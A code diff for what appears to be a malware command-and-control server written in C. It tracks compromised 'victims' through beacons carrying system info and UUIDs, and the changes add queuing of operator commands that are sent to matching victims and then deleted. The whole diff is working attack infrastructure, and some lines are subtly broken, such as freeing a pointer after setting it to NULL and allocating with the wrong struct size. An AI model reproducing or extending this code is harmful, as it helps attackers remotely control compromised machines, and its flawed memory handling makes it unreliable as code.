@@ -35,6 +35,7 @@
 pthread_mutex_t NET_PTHREAD_MUTEX = PTHREAD_MUTEX_INITIALIZER;
 
 int NET_VICTIMS_TOTAL = 0;
+int NET_COMMANDS_TOTAL= 0;
 
 net_client_beacon_t **net_create_victims(){
   int count = NET_MAX_CLIENTS;
@@ -64,6 +65,17 @@ net_server_beacon_t **net_create_commands(){
   return v;
 }
 
+bool net_update_commands_count(net_server_beacon_t **p_commands){
+  int n_commands = 0;
+  for (int i = 0; i < NET_MAX_CLIENTS; i++){
+    if (p_commands[i] != NULL){
+      n_commands++;
+    }
+    NET_COMMANDS_TOTAL = n_commands;
+  }
+  return true;
+}
+
 int net_update_commands(net_server_beacon_t *command, net_server_beacon_t **commands){
   for (int i = 0; i < NET_MAX_CLIENTS; i++){
     if (commands[i] != NULL && (strcmp(commands[i]->uuid, command->uuid) == 0)){
@@ -74,6 +86,7 @@ int net_update_commands(net_server_beacon_t *command, net_server_beacon_t **comm
   for (int i = 0; i < NET_MAX_CLIENTS; i++){
     if (commands[i] == NULL){
       commands[i] = command;
+      net_update_commands_count(commands);
       return i;
     }
   }
@@ -86,6 +99,7 @@ bool net_remove_commands(net_server_beacon_t *command, net_server_beacon_t **com
       memset(commands[i], 0, sizeof(net_server_beacon_t));
       commands[i] = NULL;
       free(commands[i]);
+      net_update_commands_count(commands);
     }
   }
   return false;
@@ -162,10 +176,11 @@ void *net_t_client(void *args){
   net_t_client_args_t *p_args = args;
   int sock = p_args->client_fd;
   net_client_beacon_t **p_victims = p_args->p_victims;
-  //net_server_beacon_t **p_commands = p_args->p_commands;
+  net_server_beacon_t **p_commands = p_args->p_commands;
   net_client_beacon_t *p_net_client_beacon = malloc(sizeof(net_client_beacon_t));
   net_server_beacon_t *p_net_server_beacon = malloc(sizeof(net_client_beacon_t));
   while (true){
+    bool command = false;
     int read = recv(sock, p_net_client_beacon, sizeof(net_client_beacon_t), 0);
     if (!read){
       break;
@@ -185,11 +200,24 @@ void *net_t_client(void *args){
     /*        p_net_client_beacon->sysinfo.release, */
     /*        p_net_client_beacon->sysinfo.cpu_usage); */
     pthread_mutex_unlock(&NET_PTHREAD_MUTEX);
-    p_net_server_beacon->xor_key = DEFS_XOR_KEY;
-    p_net_server_beacon->status = true;
-    if (send(sock, p_net_server_beacon, sizeof(net_server_beacon_t), 0) < 0){
-      fprintf(stderr, "[x] %s\n", strerror(errno));
-      return false;
+    for (int i = 0; i < NET_MAX_CLIENTS; i++){
+      if (p_commands[i] != NULL &&
+          (strcmp(p_net_client_beacon->sysinfo.uuid,
+                  p_commands[i]->uuid) == 0)){
+        command = true;
+        if (send(sock, p_commands[i], sizeof(net_server_beacon_t), 0) < 0){
+          fprintf(stderr, "[-] %s\n", strerror(errno));
+        }
+        net_remove_commands(p_commands[i], p_commands);
+      }
+    }
+    if (command == false){
+      p_net_server_beacon->xor_key = DEFS_XOR_KEY;
+      p_net_server_beacon->status = true;
+      if (send(sock, p_net_server_beacon, sizeof(net_server_beacon_t), 0) < 0){
+        fprintf(stderr, "[x] %s\n", strerror(errno));
+        return false;
+      }
     }
   }
   pthread_mutex_lock(&NET_PTHREAD_MUTEX);
